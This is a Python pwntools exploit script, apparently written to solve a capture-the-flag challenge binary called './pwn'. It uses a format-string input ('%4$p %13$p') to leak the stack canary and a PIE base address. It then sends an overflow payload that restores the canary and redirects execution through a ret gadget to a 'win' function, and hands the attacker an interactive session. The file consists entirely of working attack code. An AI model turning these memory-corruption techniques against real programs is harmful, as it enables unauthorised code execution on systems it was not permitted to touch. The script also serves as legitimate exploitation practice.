#!/bin/python3
from pwn import *
import sys

binary = "./pwn"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

script = '''
'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    io = start()
    io.recvuntil('your last streak? ')
    #format_str = "%p"*20
    format_str = "%4$p %13$p"
    #format_str = "%4$p"
    io.sendline(format_str)
    io.recvuntil('Your current streak: ')
    leak = io.recvline().decode('utf-8')
    log.info(f"Leak : {leak})")
    stack = [x if x != '(nil)' else '0x0' for x in leak.strip().split()]
    log.info(f"Stack info :{stack}")
    
    # csu  = 0xb00
    libc_csu_fini = stack[0]

    # pie + aslr base
    base = int(libc_csu_fini, 16) - 0xb00 # elf.sym['_libc_csu_fini'] 
    win = elf.sym['get_streak'] + base

    log.info(f"Win function : {hex(win)}")

    canary = int(stack[1], 16)

    log.info(f"Canary : {hex(canary)}")

    offset_to_canary = 24
    ret = 0x00000000000006fe +  base
    payload = flat(
        cyclic(offset_to_canary),
        canary,
        cyclic(8),
        ret,
        win
    )

    log.info(f"Payload : {payload}")

    #io.recvuntil("We miss you!ðŸ˜¢\n")
    io.sendline(payload)
    io.interactive()



if __name__ == "__main__":
    main()